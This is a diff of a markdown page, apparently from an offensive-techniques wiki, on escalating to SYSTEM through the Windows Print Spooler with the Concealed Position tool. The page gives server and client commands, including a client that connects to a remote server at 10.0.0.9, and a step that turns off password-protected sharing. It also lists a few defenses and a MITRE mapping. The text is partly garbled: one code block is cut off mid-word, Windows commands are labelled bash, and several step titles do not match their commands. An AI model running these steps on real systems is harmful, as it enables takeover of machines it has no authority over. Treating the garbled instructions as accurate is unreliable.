@@ -41,11 +41,15 @@ This technique abuses the Windows Print Spooler service to elevate privileges. A
 
 Business Value: This technique can be used by attackers to gain access to sensitive data, steal credentials or perform other malicious activities on a system. By gaining access to the SYSTEM account, the attacker can take full control of the affected system and use it as a beachhead to launch further attacks.
 
+ 
+
 ## Requirements
 
 1. Access to the target system
 
 1. Ability to execute code on the target system
+
+ 
 
 ## Defense
 
@@ -55,11 +59,15 @@ Business Value: This technique can be used by attackers to gain access to sensit
 
 1. Implement least privilege access control to limit the impact of a potential attack
 
+ 
+
 ## Objectives
 
 1. Gain elevated privileges on the target system
 
 1. Compromise the target system
+
+ 
 
 # Instructions
 
@@ -70,11 +78,19 @@ Business Value: This technique can be used by attackers to gain access to sensit
 4. Run the command 'cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE' to create the client
 5. Run the command 'cp_client.exe -l -e ACIDDAMAGE' to launch the client
 
+ 
+
+
+
 **Code**: [[cp_server.exe -e ACIDDAMAGE
 # Get-Printer
 # Set th]]
 
+
+
 > The 'cp_server.exe' command is used to create a Concealed Position server with the name 'ACIDDAMAGE'. The 'Get-Printer' command is used to retrieve the printer. The 'Advanced Sharing Settings' should be turned off to allow the client to connect to the server. The 'cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE' command is used to create a client with the name 'ACIDDAMAGE' and connect it to the server at IP address '10.0.0.9'. The 'cp_client.exe -l -e ACIDDAMAGE' command is used to launch the client.
+
+
 
 **Command** ([[Copy server executable with specified parameters]]):
 
@@ -82,11 +98,19 @@ Business Value: This technique can be used by attackers to gain access to sensit
 cp_server.exe -e ACIDDAMAGE
 ```
 
+
+
+
+
 **Command** ([[Get printer information]]):
 
 ```bash
 # Get-Printer
 ```
+
+
+
+
 
 **Command** ([[Turn off password protected sharing]]):
 
@@ -94,17 +118,27 @@ cp_server.exe -e ACIDDAMAGE
 # Set the "Advanced Sharing Settings" -> "Turn off password protected sharing"
 ```
 
+
+
+
+
 **Command** ([[Copy client executable with specified parameters]]):
 
 ```bash
 cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
 ```
 
+
+
+
+
 **Command** ([[List shared printers]]):
 
 ```bash
 cp_client.exe -l -e ACIDDAMAGE
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -136,3 +170,5 @@ cp_client.exe -l -e ACIDDAMAGE
 - [[Bring Your Own Vulnerability]]
 - [[EoP - Printers]]
 - [[Windows - Privilege Escalation]]
+
+
